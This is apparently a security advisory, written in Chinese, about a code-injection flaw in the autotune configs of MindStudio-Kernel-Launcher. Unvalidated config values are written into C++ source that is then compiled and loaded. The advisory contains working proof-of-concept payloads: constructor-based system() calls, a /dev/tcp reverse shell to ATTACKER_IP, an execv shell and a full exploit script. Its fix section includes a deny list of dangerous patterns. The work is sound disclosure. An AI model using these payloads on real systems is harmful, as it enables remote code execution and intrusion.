# cross-module-configs-to-command-exec：@autotune装饰器configs注入致跨模块命令执行

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | cross-module-configs-to-command-exec |
| **漏洞类型** | Cross-Module Attack Chain (CWE-94: Code Injection, CWE-78: OS Command Injection) |
| **严重程度** | Critical |
| **置信度** | 95% → **已确认** |
| **影响版本** | MindStudio-Kernel-Launcher (当前版本) |
| **攻击复杂度** | 低 |
| **影响范围** | 远程/本地代码执行 |

### 漏洞摘要

MindStudio-Kernel-Launcher 的 `@autotune` 装饰器存在完整的跨模块攻击链。用户通过 `configs` 参数可向 C++ 源代码注入任意内容，经过编译后生成的恶意共享库在加载时执行攻击者指定的代码。该攻击链跨越 3 个模块（optune → launcher → driver），最终实现任意命令执行。

---

## 攻击链完整路径分析

### 数据流图

```
[IN] configs (用户输入)
    ↓
tuner.py:251 @autotune(configs) 装饰器
    ↓
tuner.py:272 Executor(configs, ...)
    ↓
tuner.py:190 config = self._configs[index] (取出单个配置)
    ↓
tuner.py:115 self.replacer.replace_config(config, kernel_src_file)
    ↓
kernel_modifier.py:93-97 Replacer.replace_config() 遍历 config.items()
    ↓
kernel_modifier.py:63-91 _replace_param(key, val, lines) ← 【注入点】
    ↓                    val 直接写入 C++ 源代码，无内容过滤！
kernel_modifier.py:53-59 _write_to_file(lines, new_src_file)
    ↓                    生成包含恶意代码的 .cpp 文件
tuner.py:127 compile(build_script, launch_src_file, output_so_path)
    ↓
compiler.py:205 subprocess.run(["bash", build_script, abs_launch_src_path, abs_output_bin_path])
    ↓                    编译恶意源代码为共享库 .so
driver.py:103-105 importlib.exec_module(module)
    ↓                    【执行点】加载共享库时触发恶意代码
[OUT] Arbitrary Code Execution
```

### 关键代码分析

#### 1. 用户输入入口 - `tuner.py:251`

```python
def autotune(configs: List[Dict], warmup: int = 300, repeat: int = 1, device_ids=None):
    """Decorator for auto-tuning a kernel. Evaluate the configs and present the best one.
    Args:
        configs (List[Dict]): list of multiple key-value pairs.  ← 用户可控输入
    ...
```

`configs` 参数由用户直接提供，每个配置项是一个字典，包含键值对。

#### 2. 输入验证缺陷 - `autotune_utils.py:39-49`

```python
def check_configs(configs):
    if not configs or not isinstance(configs, list):
        raise ValueError('The autotune configs is not a valid list.')
    for config in configs:
        if not isinstance(config, dict):
            raise ValueError(f'The config {config} is not a valid dict.')
        for key, val in config.items():
            if not key or not isinstance(key, str):
                raise ValueError(f'The key {key} is not a valid str.')
            if not val or not isinstance(val, str):
                raise ValueError(f'The val {val} is not a valid str.')
    # 【关键缺陷】仅检查类型，不检查内容！
    # 未过滤: 分号(;), 大括号({}), #include, system(), exec(), 等危险字符/函数
```

验证函数仅检查 `key` 和 `val` 是否为字符串类型，**完全不验证字符串内容的安全性**。

#### 3. 代码注入点 - `kernel_modifier.py:38-50`

```python
@staticmethod
def _replace_content_for_alias_name(line_index, line, replacement):
    # replacement 是用户提供的 val，直接拼接到源代码中
    index = len(line) - len(line.lstrip())
    new_line = line[:index] + replacement  ← 【注入发生】
    if line.endswith('\n'):
        new_line += '\n'
    return new_line

@staticmethod
def _replace_content_for_tunable_name(line_index, line, replacement):
    # 同样直接拼接用户输入
    return line[:line.index('=') + 1] + ' ' + replacement + ';\n'
```

用户提供的 `replacement` (即 `val`) 直接拼接到 C++ 源代码行中，没有任何内容过滤或转义。

#### 4. 恶意文件写入 - `kernel_modifier.py:53-60`

```python
@staticmethod
def _write_to_file(lines, path):
    file_checker = FileChecker(path, "cpp")
    if not file_checker.check_output_file():
        logger.warning(f"Write lines to file {path} failed")
        return
    with open(path, 'w', encoding='utf-8') as file_handler:
        file_handler.writelines(lines)  ← 写入包含恶意代码的源文件
    os.chmod(path, 0o640)
```

`FileChecker` 仅检查文件路径和权限，**不检查写入内容的合法性**。

#### 5. 编译执行 - `compiler.py:205-206` & `driver.py:103-105`

```python
# compiler.py - 编译恶意源代码
compile_cmd = ["bash", build_script, abs_launch_src_path, abs_output_bin_path]
result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=600)

# driver.py - 加载并执行恶意共享库
spec = importlib.util.spec_from_file_location(module_name, self._module)
module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(module)  ← 加载时触发恶意构造函数
```

---

## 具体攻击示例代码 (PoC)

### PoC 1: 基础命令执行

假设目标内核源文件包含 tunable 参数标记：

```cpp
// kernel.cpp
constexpr int BLOCK_SIZE = 128; // tunable:BLOCK_SIZE
```

攻击者使用 `@autotune` 装饰器：

```python
from mskl.optune.tuner import autotune

# 恶意配置 - 注入 C++ 代码
malicious_configs = [
    {
        "BLOCK_SIZE": "128; __attribute__((constructor)) void pwn() { system(\"id > /tmp/pwned; whoami >> /tmp/pwned\"); } int dummy = "
    }
]

@autotune(configs=malicious_configs)
def exploit_kernel():
    # 正常的内核调用代码
    pass
```

**注入后的源代码：**

```cpp
constexpr int BLOCK_SIZE = 128; __attribute__((constructor)) void pwn() { system("id > /tmp/pwned; whoami >> /tmp/pwned"); } int dummy = ;
```

编译生成的共享库在加载时，`__attribute__((constructor))` 标记的 `pwn()` 函数将自动执行，在 `/tmp/pwned` 中写入系统信息。

### PoC 2: 反向 Shell

```python
malicious_configs = [
    {
        "BLOCK_SIZE": "128; #include <cstdio> #include <cstdlib> __attribute__((constructor)) void shell() { FILE* f = popen(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\", \"r\"); pclose(f); } int x = "
    }
]
```

### PoC 3: Alias 模式注入

对于使用 alias 标记的源代码：

```cpp
// kernel.cpp
actlass::gemm::GemmShape<128, 256, 256> tile_shape; // tunable:L0C_Tile_Shape
```

攻击配置：

```python
malicious_configs = [
    {
        "L0C_Tile_Shape": "actlass::gemm::GemmShape<128, 256, 256>; void __attribute__((constructor)) hack() { execv(\"/bin/sh\", NULL); }"
    }
]
```

### PoC 4: 完整攻击脚本

```python
#!/usr/bin/env python3
"""
MindStudio-Kernel-Launcher Autotune Code Injection PoC
CVE: Pending
"""

import os
import sys

# 创建恶意内核源文件模板
KERNEL_TEMPLATE = """
#include <acl/acl.h>

extern "C" {

// tunable parameter - attack target
constexpr int TILE_SIZE = 16; // tunable:TILE_SIZE

int kernel_entry(int blockdim, int l2ctrl, aclrtStream stream, void* arg) {
    // Normal kernel logic would be here
    return 0;
}
}
"""

def create_malicious_kernel():
    """创建包含 tunable 标记的内核文件"""
    with open("malicious_kernel.cpp", "w") as f:
        f.write(KERNEL_TEMPLATE)

def exploit():
    from mskl.optune.tuner import autotune
    
    # 恶意配置 - 在共享库加载时执行任意命令
    payload_configs = [
        {
            "TILE_SIZE": "16; __attribute__((constructor)) static void exploit() { system(\"echo 'VULNERABILITY CONFIRMED' > /tmp/mskl_poc_proof; id >> /tmp/mskl_poc_proof\"); } int _fake = "
        }
    ]
    
    @autotune(configs=payload_configs)
    def victim_function():
        # 假设正常使用场景
        pass
    
    victim_function()
    
    # 检查攻击成功
    if os.path.exists("/tmp/mskl_poc_proof"):
        print("[+] Exploit successful! Check /tmp/mskl_poc_proof")
        with open("/tmp/mskl_poc_proof") as f:
            print(f.read())
    else:
        print("[-] Exploit may have failed or requires compilation environment")

if __name__ == "__main__":
    create_malicious_kernel()
    exploit()
```

---

## 实际可利用性评估

### 利用条件

| 条件 | 评估 |
|------|------|
| **攻击向量** | Network/Local (取决于 autotune API 的暴露方式) |
| **攻击复杂度** | 低 - 只需构造特定字符串 |
| **权限要求** | 低 - 只需能调用 autotune API |
| **用户交互** | 无需 |
| **环境依赖** | 需要 NPU 开发环境 (CANN, 编译工具链) |

### 利用场景

1. **AI 训练平台**: 如果训练平台允许用户提交自定义内核并通过 autotune 调优，攻击者可注入恶意代码
2. **共享算力平台**: 多租户环境中，恶意用户可利用此漏洞攻击其他租户或平台基础设施
3. **供应链攻击**: 如果包含 autotune 的代码被集成到第三方项目中，攻击者可通过配置注入实现持久化
4. **开发环境**: 开发者使用 autotune 测试恶意配置时，可被攻击者诱导执行危险代码

### 影响评估

| 影响 | 描述 |
|------|------|
| **机密性** | 高 - 可读取任意文件、窃取数据 |
| **完整性** | 高 - 可修改任意文件、植入后门 |
| **可用性** | 高 - 可删除文件、终止进程、DoS |

---

## 修复建议

### 1. 输入内容验证 (优先级: 高)

在 `autotune_utils.py` 的 `check_configs()` 中添加内容验证：

```python
import re

def check_configs(configs):
    if not configs or not isinstance(configs, list):
        raise ValueError('The autotune configs is not a valid list.')
    
    # 定义危险字符/模式黑名单
    DANGEROUS_PATTERNS = [
        r';',           # 语句分隔符
        r'\{', r'\}',   # 代码块
        r'#include',    # 头文件引入
        r'#define',     # 宏定义
        r'system\(',    # 命令执行
        r'exec[vle]*\(',# 执行函数
        r'popen\(',     # 进程管道
        r'__attribute__',# GCC 属性
        r'constructor', # 构造函数属性
        r'destructor',  # 析构函数属性
        r'malloc\(',    # 内存分配
        r'free\(',      # 内存释放
        r'\n',          # 换行符
        r'\r',          # 回车符
        r'//',          # 注释符
    ]
    
    for config in configs:
        if not isinstance(config, dict):
            raise ValueError(f'The config {config} is not a valid dict.')
        for key, val in config.items():
            if not key or not isinstance(key, str):
                raise ValueError(f'The key {key} is not a valid str.')
            if not val or not isinstance(val, str):
                raise ValueError(f'The val {val} is not a valid str.')
            
            # 检查危险模式
            for pattern in DANGEROUS_PATTERNS:
                if re.search(pattern, val):
                    raise ValueError(f'The val contains dangerous pattern: {pattern}')
            
            # 检查长度限制
            if len(val) > 100:  # 合理的配置值长度
                raise ValueError(f'The val {val} is too long')
```

### 2. 白名单验证 (优先级: 高)

仅允许预期格式的配置值：

```python
def validate_config_value(key: str, val: str) -> bool:
    """根据预期的配置类型验证值"""
    
    # 数值类型配置
    if key.endswith('_SIZE') or key.endswith('_NUM') or key.endswith('_COUNT'):
        if not re.match(r'^\d+$', val):
            raise ValueError(f'Invalid numeric config: {key}={val}')
    
    # 类型名称配置
    if key.startswith('Layout') or key.startswith('Element'):
        if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_:<>]*$', val):
            raise ValueError(f'Invalid type config: {key}={val}')
    
    # 形状配置
    if 'Shape' in key or 'Tile' in key:
        if not re.match(r'^<\d+,\s*\d+,\s*\d+>$', val):
            raise ValueError(f'Invalid shape config: {key}={val}')
    
    return True
```

### 3. 源代码替换安全化 (优先级: 高)

修改 `kernel_modifier.py` 使用安全的替换机制：

```python
import re

@staticmethod
def _replace_param(key, val, lines):
    # 预验证 val 内容
    if not is_safe_config_value(val):
        raise ValueError(f'Unsafe config value detected: {val}')
    
    # 使用安全的替换方式 - 只替换标识符部分
    # ...
```

### 4. 编译隔离 (优先级: 中)

在沙箱环境中编译用户控制的代码：

- 使用 Docker 容器进行编译
- 限制编译进程的网络和文件系统访问
- 使用 SELinux/AppArmor 限制编译产物权限

### 5. 共享库加载保护 (优先级: 中)

在加载共享库前进行签名验证：

```python
def load_kernel_module(module_path):
    # 验证模块签名
    if not verify_module_signature(module_path):
        raise SecurityError('Module signature verification failed')
    
    spec = importlib.util.spec_from_file_location(module_name, module_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
```

### 6. 文档警告 (优先级: 低)

在 API 文档中明确警告配置参数的安全风险：

```python
def autotune(configs: List[Dict], ...):
    """
    WARNING: The 'configs' parameter is SECURITY-SENSITIVE.
    
    Config values are directly written into C++ source files and compiled.
    Only use trusted, validated configuration values. Never accept configs
    from untrusted sources.
    
    Args:
        configs: Must be validated using mskl.utils.autotune_utils.validate_configs()
    """
```

---

## 总结

该漏洞是一个完整的跨模块攻击链，从用户配置输入到最终代码执行，每个环节都存在安全缺陷：

1. **输入验证缺失**: `check_configs()` 仅检查类型，不检查内容
2. **直接代码注入**: `_replace_param()` 将用户输入直接写入源代码
3. **编译执行链**: 编译 → 加载 → 执行，无中间验证

**修复优先级排序**: 输入内容验证 → 白名单机制 → 源代码替换安全化 → 编译隔离 → 加载保护 → 文档警告

---

## 附录：相关 CWE 参考

- **CWE-94**: Improper Control of Generation of Code ('Code Injection')
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-20**: Improper Input Validation
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
